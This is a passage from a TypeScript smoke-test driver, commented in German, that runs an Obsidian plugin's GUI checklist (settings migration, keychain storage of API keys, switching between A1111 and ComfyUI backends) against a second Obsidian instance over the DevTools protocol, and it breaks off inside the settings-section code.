/**
 * GUI-Smoke-Treiber — faehrt die Checkliste aus `docs/SMOKE.md` gegen ein **laufendes**
 * Obsidian statt von Hand.
 *
 * Warum getrackt (CORE-TEST-02 b): Der ComfyUI-Adapter wurde am 2026-08-04 gebaut und lag
 * danach zwoelf Tage ungeprueft auf `main` — die Hand-Checkliste (11 Schritte, Handover-Note)
 * ist teuer genug, dass sie liegen bleibt. Was hier automatisiert ist, kostet beim naechsten
 * Mal einen Befehl.
 *
 * Was er prueft, das die 187 vitest-Faelle strukturell nicht koennen: die **Settings-Migration
 * gegen eine echte Bestands-`data.json`** (der Unit-Test kennt nur das Objekt, nicht Obsidians
 * Lade-Kette), das **Umschalten der Bild-Sektion** (Rerender im echten Settings-Modal) und den
 * **Bildlauf gegen die echte ComfyUI**.
 *
 * ## Zweitinstanz (der richtige Ort fuer diesen Lauf — eigenes Profil, eigener Port)
 *
 * Der Port ist PFLICHT (`--port <n>`, Wert dieses Rezepts: 9400); der Treiber hat keinen Default, damit
 * ein vergessener Port nie die reguläre Instanz (9222) trifft. Die reguläre Instanz wird weder genutzt
 * noch beendet. Reihenfolge laut obsidian-plugins/AGENTS.md § Staging-Vaults (a)-(c):
 *
 * ```bash
 * echo "$STAGING_VAULTS_DIR"                                    # muss gesetzt sein (~/.zshenv)
 * UD=/tmp/obs-test-yijing-oracle; mkdir -p "$UD"
 * lsof -nP -iTCP:9400 -sTCP:LISTEN && echo "Port belegt — anderen nehmen"
 * pgrep -f "user-data-dir=$UD" && echo "Profil belegt — $UD-w19 nehmen"
 * npm run build && OBSIDIAN_PLUGIN_DIR="$STAGING_VAULTS_DIR/yijing-oracle/.obsidian/plugins/yijing-oracle" npm run deploy
 * # (a) aktuelle Version statt gebuendelter:
 * cp ~/Library/Application\ Support/obsidian/obsidian-<version>.asar "$UD"/
 * # Vault registrieren (Obsidian liest obsidian.json nur beim Start), Oberflaeche Englisch:
 * node -e 'const p=process.env.STAGING_VAULTS_DIR+"/yijing-oracle";require("fs").writeFileSync(process.argv[1]+"/obsidian.json",JSON.stringify({vaults:{yijing01:{path:p,ts:Date.now(),open:true}},language:"en"}))' "$UD"
 * /Applications/Obsidian.app/Contents/MacOS/Obsidian --user-data-dir="$UD" --remote-debugging-port=9400 &
 * # PID merken: beendet wird NUR sie, nie pkill/killall. Je Messlauf frischer Prozess.
 * python3 ~/.claude/hooks/obsidian-cdp-lock.py acquire --label yijing-oracle --intent "GUI-Smoke Zweitinstanz :9400" --exclusive focus --port 9400 --ttl 300
 * npm run smoke:gui -- --port 9400 --vault yijing-oracle    # (b) Restricted Mode, (c) Vertrauensdialog: macht `bereiteInstanzVor`
 * npm run smoke:gui -- --port 9400 --vault yijing-oracle --kein-bild   # D und E gelten als uebersprungen (Flag)
 * python3 ~/.claude/hooks/obsidian-cdp-lock.py release
 * ```
 *
 * Der erste Lauf nach dem Anlegen eines Profils ist ein Aufwaermlauf und zaehlt nicht.
 *
 * ## Bilanz in vier Zustaenden (CORE-TEST-19)
 *
 * gruen · rot · uebersprungen · nichts gemessen; `PUNKTE` ist der Nenner. Uebersprungen heisst „in dieser
 * Lage nicht anwendbar" (`--kein-bild`, Obsidian ohne native 1.13-Settings-API); „Gegenstand nicht
 * erreicht" (Einstellungen nicht zu oeffnen, kein Modell geladen, ComfyUI nicht erreichbar, Messung
 * abgebrochen) ist „nichts gemessen" und setzt Exit 1. Abbruch vor der ersten Messung: Exit 2.
 *
 * ⚠️ Chromium drosselt das Rendering nicht-fokussierter Fenster: ohne ein sichtbares Fenster bleibt die Ansicht leer
 * und man debuggt ein Phantom. `requireVisible` der Brücke holt es nach vorn (kein `osascript activate`: das trifft die reguläre Instanz).
 *
 * ## Was dieser Lauf am Wirt aendert — und zurueckdreht
 *
 * Der Migrations-Abschnitt schreibt eine kuenstliche Bestands-`data.json` und laedt das
 * Plugin neu. Der Vorwert wird **vor** dem `try` gelesen, zusaetzlich als Datei neben der
 * `data.json` gesichert (fuer den Fall, dass der Prozess hart abbricht) und im `finally`
 * zurueckgeschrieben. Erzeugte Notizen und Anhaenge wandern in den Papierkorb.
 */


import { Cdp, attachTo, bereiteInstanzVor, pollUntil, requireVisible } from "../../tools/obsidian-cdp/cdp.js";
import { createBilanz, parseArgs, runDriver } from "../../tools/obsidian-cdp/bilanz.js";
import { requireEigenerBuild } from "../../tools/obsidian-cdp/vault.js";
import { join } from "node:path";

const PLUGIN_ID = "yijing-oracle";
/** manifest.json → name. Nicht lokalisiert — taugt als Anker in der Einstellungs-Suche. */
const PLUGIN_NAME = "Yijing Oracle";
/** src/obsidian/view.ts: VIEW_TYPE_YIJING. */
const PANEL_VIEW = "yijing-oracle-panel";
const DATA_PATH = `.obsidian/plugins/${PLUGIN_ID}/data.json`;
/** Sicherungskopie fuer den Fall, dass der Lauf hart abbricht (Ctrl-C, Absturz). */
const DATA_RESCUE = `.obsidian/plugins/${PLUGIN_ID}/data.json.smoke-rescue`;
/** Schluesselbund-Eintraege dieses Plugins: je Endpunkt-Zeile einer unter diesem Praefix (Kit
 *  `endpointSecretPrefix`, `<pluginId>-ep-<id>`), dazu der alte Einzel-Eintrag bis 0.10
 *  (`LEGACY_API_KEY_SECRET_ID` in src/core/settings/migrate.ts — wird gelesen, nie geloescht). */
const EP_SECRET_PREFIX = `${PLUGIN_ID}-ep-`;
const LEGACY_SECRET_ID = "yijing-oracle-llm-api-key";

/** Bestands-`data.json` in der Form von 0.3.0: kennt weder `backend` noch `comfyWorkflow`
 *  noch `comfyStepsOverride`. Genau das ist Schritt 2 der Handover-Checkliste — die Frage
 *  ist nicht, ob die neuen Felder Defaults bekommen, sondern ob die **alten** ueberleben. */
const BESTAND_030 = {
  register: "neutral",
  readingLang: "auto",
  includeFrontmatter: true,
  image: {
    endpoint: "http://127.0.0.1:7860",
    styleSuffix: "ink wash painting, soft light, muted colors",
    negativePrompt: "text, watermark",
    size: 1024,
    steps: 31,
  },
  llm: {
    endpoints: ["http://127.0.0.1:1234", "http://127.0.0.1:11434"],
    model: "qwen3-30b",
    apiKey: "smoke-schluessel",
  },
};

/** Soll-Liste aller Pruefpunkte (der Nenner der Bilanz). Ein Name, der hier fehlt, laesst `createBilanz`
 *  werfen; ein Punkt, der nie aufgezeichnet wird, zaehlt als „nichts gemessen“. */
const PUNKTE = [
  "A1 Plugin aktiv",
  "A2 Panel oeffnet",
  "A3 Wurf erzeugt ein Hexagramm",
  "A4 Vorschau traegt Text",
  "A5 Frage-Feld ist nach dem Wurf leer",
  "B-1 Kein liegen gebliebener Smoke-Schluessel im Schluesselbund aus einem abgebrochenen Vorlauf",
  "B0 Plugin laedt mit Bestandsdaten",
  "B1 backend faellt auf a1111",
  "B2 Bild-Endpunkt unveraendert",
  "B3 eigene Werte ueberleben (steps/size/negativ)",
  "B4 neue Comfy-Felder bekommen Defaults",
  "B5 LLM-Endpunktliste unveraendert (jetzt zwei Zeilen mit URL)",
  "B6 API-Schluessel ueberlebt die Migration (je Zeile, im Schluesselbund unter yijing-oracle-ep-<id>)",
  "B7 keine Alt-Leiche activeEndpoint",
  "B8 Altwert verlaesst data.json: wandert beim Laden in den Schluesselbund",
  "B9 Altwert llm.model wandert in die Zeilen, der Schluessel verschwindet (Speicher und data.json)",
  "C1 Einstellungen-Tab oeffnet",
  "C1b Keine Settings-Zeile „Model“ und keine Option „global model“",
  "C2 A1111-Ansicht zeigt Schritte, kein Workflow-Feld",
  "C3 Umschalten auf ComfyUI tauscht die Felder",
  "C4 gueltiger Workflow wird erkannt",
  "C5 kaputtes JSON meldet einen Fehler statt zu haengen",
  "C6 leeres Feld meldet nichts",
  "C7 Zurueckschalten stellt die A1111-Felder wieder her",
  "F1 Tab liefert deklarative Definitionen",
  "F2 bedingte Zeilen werden weggelassen, nicht versteckt",
  "F3 Oberflaeche zieht nach einer Wertaenderung nach",
  "F9 die Hilfe-Zeile steht als erste Zeile oben im Settings-Tab",
  "F4 Einstellungen erscheinen in Obsidians Einstellungs-Suche",
  "F5 Fallback-Pfad (< 1.13) zeichnet dieselbe Struktur",
  "F6 maskierte Zeile bleibt ueber Aliase auffindbar",
  "F7 API-Schluessel-Feld der Endpunkt-Zeile ist maskiert (nach „aendern“)",
  "F8 Eingabe im Feld landet im Schluesselbund (Eintrag der Zeile), nicht in data.json",
  "M1 Settings zeigen den Manager statt der lokalen Liste",
  "M2 Lauf nutzt den Manager-Endpunkt und das Default-Modell",
  "M2b Manager-Lauf nutzt gewaehltes Modell, nicht den Endpunkt-Default (C1)",
  "M3 Manager aus → lokale Liste in Settings und im Lauf",
  "M1b Manager erst nach dem ersten Oeffnen des Tabs installiert: die Settings zeigen ihn nach einem Tab-Wechsel",
  "N3 Gesendeter Body traegt die Modus-Defaults (Temperatur 0.7, Denkstufe medium)",
  "N1 Abschnitt „Anfrage“ klappt auf und zeigt die Felder des Modus",
  "N6 „Letzte Anfrage“ zeigt beim Oeffnen des Tabs den gesendeten Body",
  "N2 Zwei Bearbeitungen hintereinander (Temperatur, Denkstufe) speichern und lassen den Abschnitt offen",
  "N4 Gesendeter Body folgt den Einstellungen (Ueberschreibung 0.9, Denken aus → reasoning_effort none)",
  "N5 Zuruecksetzen entfernt die Ueberschreibung und laesst den Abschnitt offen",
  "V1 Zeile mit Klartext-Schluessel: nach resolve steht kein apiKey mehr in data.json, der Wert im Schluesselbund",
  "V2 Der Schluessel der Zeile geht als Bearer an den Endpunkt",
  "V3 Ein Geheimnis in der Frage geht als Platzhalter an den Draht, nicht im Klartext",
  "V4 Die Deutung zeigt das Original wieder (Schwaerzung ist umkehrbar)",
  "V5 Eine Antwort mit Bild-URL und Platzhalter erzeugt kein img-Element",
  "V6 Ein dataviewjs-Block in der Antwort rendert als Text, nicht als Codeblock",
  "V7 Die gespeicherte Notiz traegt die entschaerfte Form (```text statt ```dataviewjs und ```mermaid, kein Fernbild, auch nicht als Referenz-Definition), kein dataviewjs-Code im DOM",
  "V8 Die gespeicherte Notiz laedt das Fernbild nicht (Zaehler am Draht bleibt 0)",
  "V9 Zeile ohne Modell: das Panel nimmt das erste Modell der Liste und merkt es in der aktiven Zeile (setModel)",
  "M4 Deutung streamt gegen den echten Endpunkt",
  "D1 Bild-Kasten erscheint bei gesetztem Endpunkt",
  "D2 Generieren startet",
  "D3 Bild kommt an und ist ein PNG",
  "D4 Anzeige zeigt Fortschritt oder nennt seinen Grund",
  "D5 Szenen-Satz steht unter dem Bild",
  "E1 Speichern legt genau eine Notiz an",
  "E2 Notiz traegt den Reading-Text",
  "E3 Bild liegt als Anhang im Vault",
] as const;

const bilanz = createBilanz({ punkte: PUNKTE });

function record(name: string, passed: boolean, detail: string): void {
  bilanz.record(name as (typeof PUNKTE)[number], passed, detail);
}

/** In dieser Lage nicht anwendbar (Flag abgewaehlt, Obsidian ohne native 1.13-Settings-API). */
function skipped(name: string, reason: string): void {
  bilanz.skipped(name as (typeof PUNKTE)[number], reason);
}

/** Der Gegenstand des Punkts wurde nicht erreicht (Vorbedingung fehlt, Messung abgebrochen) —
 *  „nichts gemessen“, nie gruen, Exit 1. */
function unmeasured(name: string, reason: string): void {
  bilanz.unmeasured(name as (typeof PUNKTE)[number], reason);
}

const aufgezeichnet = (name: string): boolean => bilanz.eintraege().some((e) => e.name === name);

const schlaf = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));

// ─── Helfer, die den Pruefling kennen ──────────────────────────────────────────────

/** Plugin neu laden, ohne Obsidian neu zu starten. Danach ist die Instanz eine **andere** —
 *  jede gemerkte Referenz auf `plugin` ist tot. */
async function reloadPlugin(cdp: Cdp): Promise<void> {
  await cdp.evaluate(`
    await app.plugins.disablePlugin(${JSON.stringify(PLUGIN_ID)});
    await app.plugins.enablePlugin(${JSON.stringify(PLUGIN_ID)});
    await new Promise((r) => setTimeout(r, 600));
    return true;
  `);
}

async function readVaultFile(cdp: Cdp, path: string): Promise<string | null> {
  return cdp.evaluate<string | null>(`
    const p = ${JSON.stringify(path)};
    if (!(await app.vault.adapter.exists(p))) return null;
    return await app.vault.adapter.read(p);
  `);
}

async function writeVaultFile(cdp: Cdp, path: string, body: string): Promise<void> {
  await cdp.evaluate(`
    await app.vault.adapter.write(${JSON.stringify(path)}, ${JSON.stringify(body)});
    return true;
  `);
}

async function removeVaultFile(cdp: Cdp, path: string): Promise<void> {
  await cdp.evaluate(`
    const p = ${JSON.stringify(path)};
    if (await app.vault.adapter.exists(p)) await app.vault.adapter.remove(p);
    return true;
  `);
}

/** Alle Schluesselbund-Eintraege des Plugins (Zeilen-Praefix und alter Einzel-Eintrag) als
 *  Id → Wert; `null` als Ganzes, wenn Obsidian keinen Schluesselbund hat (< 1.11.4). */
type Bund = Record<string, string>;
async function schluesselbund(cdp: Cdp): Promise<Bund | null> {
  return cdp.evaluate<Bund | null>(`
    const s = app.secretStorage; if (!s) return null;
    const ids = (typeof s.listSecrets === "function" ? s.listSecrets() : []).filter((i) => i.startsWith(${JSON.stringify(EP_SECRET_PREFIX)}));
    ids.push(${JSON.stringify(LEGACY_SECRET_ID)});
    const out = {};
    for (const id of ids) { const v = s.getSecret(id); if (v) out[id] = v; }
    return out;
  `);
}

/** Zustand von vorher wiederherstellen: was dazugekommen ist, wird entfernt (deleteSecret gibt es
 *  zur Laufzeit, nicht in der .d.ts — s. _docs/LESSONS.md 2026-08-30; sonst Leerstring), was
 *  fehlt oder anders ist, wird zurueckgeschrieben. */
async function schluesselbundZuruecksetzen(cdp: Cdp, vorher: Bund): Promise<void> {
  await cdp.evaluate(`
    const s = app.secretStorage; if (!s) return false;
    const vorher = ${JSON.stringify(vorher)};
    const jetzt = (typeof s.listSecrets === "function" ? s.listSecrets() : []).filter((i) => i.startsWith(${JSON.stringify(EP_SECRET_PREFIX)}));
    jetzt.push(${JSON.stringify(LEGACY_SECRET_ID)});
    for (const id of jetzt) if (!(id in vorher) && s.getSecret(id)) { if (typeof s.deleteSecret === "function") s.deleteSecret(id); else s.setSecret(id, ""); }
    for (const [id, wert] of Object.entries(vorher)) if (s.getSecret(id) !== wert) s.setSecret(id, wert);
    return true;
  `);
}

/** Die Einstellungen des Prueflings auslesen — als reines Datenobjekt. */
async function settingsOf(cdp: Cdp): Promise<Record<string, unknown> | null> {
  return cdp.evaluate<Record<string, unknown> | null>(`
    const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
    return p ? JSON.parse(JSON.stringify(p.settings)) : null;
  `);
}

/**
 * Wo die Einstellungen-Oberflaeche liegt.
 *
 * Ab Obsidian 1.13 sind die Einstellungen ein **eigenes Fenster**, kein Modal im
 * Hauptfenster (gemessen am 2026-08-16 gegen 1.13.7: `app.setting.activeTab.id` meldete
 * korrekt `yijing-oracle`, waehrend `document.querySelector(".modal.mod-settings")` im
 * Workspace-Fenster `null` blieb — der Aufruf gelingt, die Messung greift ins Leere).
 * Bis 1.12 war es ein Modal. Der Treiber haelt deshalb beide Faelle offen und leitet die
 * Antwort aus der Sache ab, statt eine Version anzunehmen.
 */
interface SettingsUi {
  /** Verbindung zu dem Renderer, der die Oberflaeche traegt. */
  cdp: Cdp;
  /** Selektor-Praefix: "" im eigenen Fenster, ".modal.mod-settings " beim Modal. */
  praefix: string;
  /** Nur gesetzt, wenn eine ZWEITE Verbindung aufgebaut wurde (die geschlossen gehoert). */
  eigenesFenster: boolean;
}

async function openSettingsTab(cdp: Cdp, port: number): Promise<SettingsUi | null> {
  await cdp.evaluate(`
    app.setting.open();
    await new Promise((r) => setTimeout(r, 400));
    app.setting.openTabById(${JSON.stringify(PLUGIN_ID)});
    await new Promise((r) => setTimeout(r, 800));
    return true;
  `);

  // Erkennung ODER statt UND: `.okit-ep-status` markiert die LOKALE Endpunkt-Liste, `.okit-collapsible-header`
  // den Abschnitt „Anfrage“, den die Verbindung in jedem Fall zeichnet — auch mit LLM Endpoint Manager,
  // wo die lokale Liste fehlt (Abschnitt M). Der Plugin-Name im Tab-Text taugt nur als dritter Anker:
  // ab 1.14 steht er im Inhaltsbereich nicht mehr (gemessen 2026-10-09; M1–M3 liefen daran ins Leere).
  const marker = `Boolean(root.querySelector(".okit-ep-status, .okit-collapsible-header")) || Boolean(root.textContent && root.textContent.includes(${JSON.stringify(PLUGIN_NAME)}))`;

  // Fall 1 (bis 1.12): Modal im selben Fenster.
  const alsModal = await cdp.evaluate<boolean>(
    `const root = document.querySelector(".modal.mod-settings"); return Boolean(root) && (${marker});`,
  );
  if (alsModal) return { cdp, praefix: ".modal.mod-settings ", eigenesFenster: false };

  // Fall 2 (ab 1.13): eigenes Fenster. Das Kriterium ist nicht der Titel (der ist
  // lokalisiert), sondern die Sache: kein Workspace, aber unsere Sektion im DOM.
  const zweit = await attachTo("settings", port, PLUGIN_ID);
  if (!zweit) return null;
  const da = await zweit.evaluate<boolean>(`const root = document; return ${marker};`);
  if (!da) {
    zweit.close();
    return null;
  }
  return { cdp: zweit, praefix: "", eigenesFenster: true };
}

/** Schliesst die Oberflaeche — der Befehl gehoert ins Hauptfenster, auch wenn gemessen
 *  wurde im zweiten. */
async function closeSettings(cdp: Cdp, ui: SettingsUi | null): Promise<void> {
  if (ui?.eigenesFenster) ui.cdp.close();
  await cdp.evaluate(`app.setting.close(); await new Promise((r) => setTimeout(r, 200)); return true;`);
}

/**
 * Die Bild-Sektion im Settings-Modal beschreiben — **sprachunabhaengig**.
 *
 * Nicht ueber Beschriftungen: die haengen an der UI-Sprache, und ein Treiber, der in
 * Jays deutschem Obsidian gruen ist und in einem englischen rot, misst die Sprache statt
 * des Verhaltens. Die Platzhalter sind dagegen Konstanten aus dem Code
 * (`DEFAULT_IMAGE_SETTINGS.steps` = 28, Override = "—").
 */
/** Wurzel-Ausdruck fuer Messungen in der Einstellungen-Oberflaeche. Im eigenen Fenster
 *  ist das `document`, beim Modal dessen Container — damit dieselben Selektoren in
 *  beiden Faellen dasselbe treffen. */
function wurzelAusdruck(ui: SettingsUi): string {
  // `document.body`, nicht `document`: `Document.textContent` ist immer null. M1 las damit seit jeher den
  // Leerstring und war rot, ohne je den Tab gemessen zu haben (gemessen 2026-10-09, Welle 15; die
  // „vorbestehende“ Baseline-Rotung war dieser Treiberfehler, kein Plugin-Befund).
  return ui.praefix ? `document.querySelector(".modal.mod-settings")` : `document.body`;
}

async function bildSektion(ui: SettingsUi): Promise<{
  workflowArea: boolean;
  stepsA1111: boolean;
  stepsOverride: boolean;
  backendWert: string | null;
}> {
  return ui.cdp.evaluate(`
    const modal = ${wurzelAusdruck(ui)};
    if (!modal) return { workflowArea: false, stepsA1111: false, stepsOverride: false, backendWert: null };
    const sel = [...modal.querySelectorAll("select")].find(
      (s) => s.querySelector('option[value="comfyui"]') && s.querySelector('option[value="a1111"]'),
    );
    return {
      workflowArea: Boolean(modal.querySelector(".yijing-workflow-status")),
      stepsA1111: Boolean(modal.querySelector('input[placeholder="28"]')),
      stepsOverride: Boolean(modal.querySelector('input[placeholder="—"]')),
      backendWert: sel ? sel.value : null,
    };
  `);
}

/** Backend ueber das echte Dropdown umschalten (nicht ueber die Settings-API) — geprueft
 *  werden soll ja gerade der Rerender, den `onChange` ausloest. */
async function setzeBackend(ui: SettingsUi, wert: "a1111" | "comfyui"): Promise<boolean> {
  const ok = Boolean(await ui.cdp.evaluate<boolean>(`
    const modal = ${wurzelAusdruck(ui)};
    if (!modal) return false;
    const sel = [...modal.querySelectorAll("select")].find(
      (s) => s.querySelector('option[value="comfyui"]') && s.querySelector('option[value="a1111"]'),
    );
    if (!sel) return false;
    sel.value = ${JSON.stringify(wert)};
    sel.dispatchEvent(new Event("change"));
    return true;
  `));
  await schlaf(600); // rerender() zeichnet die Sektion neu
  return ok;
}

/** Text in die Workflow-Textarea legen und Obsidians `onChange` ausloesen. */
async function setzeWorkflow(ui: SettingsUi, json: string): Promise<boolean> {
  const ok = Boolean(await ui.cdp.evaluate<boolean>(`
    const status = document.querySelector("${ui.praefix}.yijing-workflow-status");
    const item = status ? status.closest(".setting-item") : null;
    const ta = item ? item.querySelector("textarea") : null;
    if (!ta) return false;
    ta.value = ${JSON.stringify(json)};
    ta.dispatchEvent(new Event("input"));
    return true;
  `));
  await schlaf(400);
  return ok;
}

async function workflowStatus(ui: SettingsUi): Promise<{ ok: boolean; fehler: boolean; text: string } | null> {
  return ui.cdp.evaluate(`
    const el = document.querySelector("${ui.praefix}.yijing-workflow-status");
    if (!el) return null;
    return { ok: el.classList.contains("is-ok"), fehler: el.classList.contains("is-error"), text: (el.textContent || "").trim() };
  `);
}

/** Das Orakel-Panel oeffnen und auf sein DOM warten. */
async function openPanel(cdp: Cdp): Promise<boolean> {
  await cdp.evaluate(`
    app.commands.executeCommandById(${JSON.stringify(`${PLUGIN_ID}:open-view`)});
    await new Promise((r) => setTimeout(r, 700));
    return true;
  `);
  const da = await pollUntil<boolean>(cdp, `return Boolean(document.querySelector(".yijing-oracle .yijing-title"));`, 8000, 400);
  return Boolean(da);
}

/** Einen Knopf im Panel ueber seine Position klicken — die Beschriftungen sind
 *  sprachabhaengig, die Reihenfolge der Aktionsreihen ist es nicht. */
async function clickPanelButton(cdp: Cdp, auswahl: string): Promise<boolean> {
  return Boolean(await cdp.evaluate<boolean>(`
    const el = document.querySelector(${JSON.stringify(auswahl)});
    if (!el) return false;
    el.click();
    await new Promise((r) => setTimeout(r, 400));
    return true;
  `));
}

// ─── Abschnitte ────────────────────────────────────────────────────────────────────

/** A — Laden und Panel (Handover-Schritt 1). */
/** Meldung von `bereiteInstanzVor`, falls das Plugin trotz Vorbereitung nicht geladen ist (gehoert in A1). */
let instanzHinweis = "";

async function abschnittPanel(cdp: Cdp): Promise<void> {
  console.log("\n── A · Laden und Panel ──");

  const aktiv = await cdp.evaluate<boolean>(`return Boolean(app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}]);`);
  record("A1 Plugin aktiv", Boolean(aktiv), aktiv ? "app.plugins kennt die Instanz" : `Plugin nicht geladen${instanzHinweis ? ` — ${instanzHinweis}` : ""}`);
  if (!aktiv) return;

  const offen = await openPanel(cdp);
  record("A2 Panel oeffnet", offen, offen ? ".yijing-oracle mit Titel im DOM" : "Panel-DOM kam nicht zustande");
  if (!offen) return;

  // Frage stellen und werfen. Der Wurf-Knopf ist der einzige in der ERSTEN Aktionsreihe.
  await cdp.evaluate(`
    const q = document.querySelector(".yijing-oracle .yijing-question");
    if (q) { q.value = "Smoke-Lauf: was traegt diese Pruefung?"; q.dispatchEvent(new Event("input")); }
    return true;
  `);
  const geworfen = await clickPanelButton(cdp, ".yijing-oracle .yijing-actions button");
  await schlaf(500);

  const wurf = await cdp.evaluate<{ linien: number; vorschau: number; frageLeer: boolean }>(`
    const root = document.querySelector(".yijing-oracle");
    if (!root) return { linien: 0, vorschau: 0, frageLeer: false };
    const q = root.querySelector(".yijing-question");
    return {
      linien: root.querySelectorAll(".yijing-line").length,
      vorschau: (root.querySelector(".yijing-preview")?.textContent || "").trim().length,
      frageLeer: q ? q.value === "" : false,
    };
  `);
  record(
    "A3 Wurf erzeugt ein Hexagramm",
    geworfen && wurf.linien === 6,
    `${wurf.linien} Linien gezeichnet (erwartet 6)`,
  );
  record(
    "A4 Vorschau traegt Text",
    wurf.vorschau > 200,
    `${wurf.vorschau} Zeichen in .yijing-preview`,
  );
  // Regression aus 0.1.1: "Neue Frage" liess den alten Text stehen.
  record("A5 Frage-Feld ist nach dem Wurf leer", wurf.frageLeer, wurf.frageLeer ? "Feld geleert" : "alter Text steht noch");
}

/** B — Bestandsverhalten (Handover-Schritt 2). Der teuerste Punkt der Checkliste und
 *  der einzige, bei dem ein Fehlschlag Jays produktive Konfiguration betrifft. */
async function abschnittMigration(cdp: Cdp): Promise<void> {
  console.log("\n── B · Bestandsverhalten (Settings-Migration) ──");

  await writeVaultFile(cdp, DATA_PATH, JSON.stringify(BESTAND_030, null, 2));
  await reloadPlugin(cdp);

  const s = await settingsOf(cdp);
  if (!s) {
    record("B0 Plugin laedt mit Bestandsdaten", false, "keine Instanz nach dem Neuladen — Ladefehler");
    return;
  }
  record("B0 Plugin laedt mit Bestandsdaten", true, "Instanz nach dem Neuladen vorhanden");

  const img = (s.image ?? {}) as Record<string, unknown>;
  const llm = (s.llm ?? {}) as Record<string, unknown>;

  record(
    "B1 backend faellt auf a1111",
    img.backend === "a1111",
    `backend=${JSON.stringify(img.backend)} (erwartet "a1111")`,
  );
  record(
    "B2 Bild-Endpunkt unveraendert",
    img.endpoint === BESTAND_030.image.endpoint,
    `endpoint=${JSON.stringify(img.endpoint)}`,
  );
  record(
    "B3 eigene Werte ueberleben (steps/size/negativ)",
    img.steps === 31 && img.size === 1024 && img.negativePrompt === BESTAND_030.image.negativePrompt,
    `steps=${String(img.steps)} size=${String(img.size)} negativ=${JSON.stringify(img.negativePrompt)}`,
  );
  record(
    "B4 neue Comfy-Felder bekommen Defaults",
    img.comfyWorkflow === "" && img.comfyStepsOverride === null,
    `comfyWorkflow=${JSON.stringify(img.comfyWorkflow)} comfyStepsOverride=${JSON.stringify(img.comfyStepsOverride)}`,
  );

  // Seit der Verbindung ist die Liste eine EndpointConfig[] (umgeschrieben: bis 0.10 ein string[]).
  const eps = Array.isArray(llm.endpoints) ? (llm.endpoints as Array<{ url?: string; apiKey?: string; secretId?: string }>) : [];
  record(
    "B5 LLM-Endpunktliste unveraendert (jetzt zwei Zeilen mit URL)",
    eps.length === 2 && eps[0]?.url === BESTAND_030.llm.endpoints[0] && eps[1]?.url === BESTAND_030.llm.endpoints[1],
    `endpoints=${JSON.stringify(eps.map((e) => e.url))}`,
  );
  const bund = await schluesselbund(cdp);
  // Der Fund aus dem Kit-0.23.0-Seed: ein globaler Schluessel, den eine Migration still
  // fallen laesst, ergibt "Endpunkt nie erreichbar" ohne jede Meldung. Seit der Verbindung
  // traegt JEDE Zeile den Schluessel (je Zeile ein Schluesselbund-Eintrag), nicht mehr ein
  // globales Feld; bei einem Schluesselbund steht der Wert dort, sonst in der Zeile.
  const wertVonZeile = (e: { apiKey?: string; secretId?: string }): string | undefined =>
    bund ? (e.secretId ? bund[e.secretId] : undefined) : e.apiKey;
  record(
    "B6 API-Schluessel ueberlebt die Migration (je Zeile, im Schluesselbund unter yijing-oracle-ep-<id>)",
    eps.length === 2 && eps.every((e) => wertVonZeile(e) === BESTAND_030.llm.apiKey)
      && (!bund || eps.every((e) => (e.secretId ?? "").startsWith(EP_SECRET_PREFIX))),
    `${bund ? "Schluesselbund" : "kein Schluesselbund (< 1.11.4), Zeile"}: ${JSON.stringify(eps.map((e) => ({ secretId: e.secretId ?? null, wert: wertVonZeile(e) ?? null })))}`,
  );
  // Gegenstueck zur Migration: die Leiche darf NICHT zurueckkommen.
  record(
    "B7 keine Alt-Leiche activeEndpoint",
    !("activeEndpoint" in llm),
    "activeEndpoint" in llm ? "Feld ist wieder da" : "Feld fehlt wie erwartet",
  );
  // B6 misst den Speicher, das hier misst die PLATTE (umgeschrieben: vorher `llm.apiKey` in
  // data.json). Mit Schluesselbund traegt data.json weder `llm.apiKey` noch ein `apiKey` an einer
  // Zeile; ohne (< 1.11.4) bleibt der Wert in der Zeile.
  const platte = JSON.parse((await readVaultFile(cdp, DATA_PATH)) ?? "{}") as { llm?: { apiKey?: string; endpoints?: Array<{ apiKey?: string }> } };
  const zeilenMitKlartext = (platte.llm?.endpoints ?? []).filter((e) => typeof e.apiKey === "string" && e.apiKey !== "").length;
  record(
    "B8 Altwert verlaesst data.json: wandert beim Laden in den Schluesselbund",
    bund
      ? platte.llm?.apiKey === undefined && zeilenMitKlartext === 0
      : platte.llm?.apiKey === undefined && zeilenMitKlartext === eps.length,
    bund
      ? `data.json: llm.apiKey ${platte.llm?.apiKey === undefined ? "fehlt" : "ist noch da"}, ${zeilenMitKlartext} Zeile(n) mit Klartext-Schluessel · Schluesselbund: ${Object.keys(bund).filter((i) => i.startsWith(EP_SECRET_PREFIX)).length} Zeilen-Eintrag/-Eintraege, alter Einzel-Eintrag ${LEGACY_SECRET_ID in bund ? "unangetastet" : "(war nicht gesetzt)"}`
      : `kein Schluesselbund (< 1.11.4) — ${zeilenMitKlartext} Zeile(n) mit Klartext-Schluessel`,
  );
  // Welle 17: das globale Modell (`llm.model`, Altwert „qwen3-30b“) ist abgeschafft. Es wandert beim Laden
  // einmal in jede Zeile ohne Modell; der Schluessel verlaesst Speicher UND Platte.
  record(
    "B9 Altwert llm.model wandert in die Zeilen, der Schluessel verschwindet (Speicher und data.json)",
    eps.length === 2 && eps.every((e) => (e as { model?: string }).model === BESTAND_030.llm.model)
      && !("model" in llm) && !("model" in (platte.llm ?? {})),
    `Modelle der Zeilen: ${JSON.stringify(eps.map((e) => (e as { model?: string }).model ?? null))} · llm.model im Speicher: ${"model" in llm} · auf der Platte: ${"model" in (platte.llm ?? {})}`,
  );
}

/** C — Bild-Sektion im Settings-Modal (Handover-Schritte 3, 6, 9). */
async function abschnittSettings(cdp: Cdp, port: number, workflowFixture: string): Promise<void> {
  console.log("\n── C · Bild-Sektion im Einstellungen-Fenster ──");

  const ui = await openSettingsTab(cdp, port);
  record(
    "C1 Einstellungen-Tab oeffnet",
    ui !== null,
    ui ? `Bild-Sektion sichtbar (${ui.eigenesFenster ? "eigenes Fenster, ab 1.13" : "Modal, bis 1.12"})` : "Tab-Inhalt in keinem Fenster gefunden",
  );
  if (!ui) return;

  // Welle 17: keine eigene Zeile „Modell“ mehr, keine Option „global model“ in einer Auswahl.
  const modellUi = await ui.cdp.evaluate<{ zeile: boolean; option: boolean }>(`
    const names = [...document.querySelectorAll(${JSON.stringify(ui.praefix)} + ".setting-item-name")].map((n) => (n.textContent || "").trim().toLowerCase());
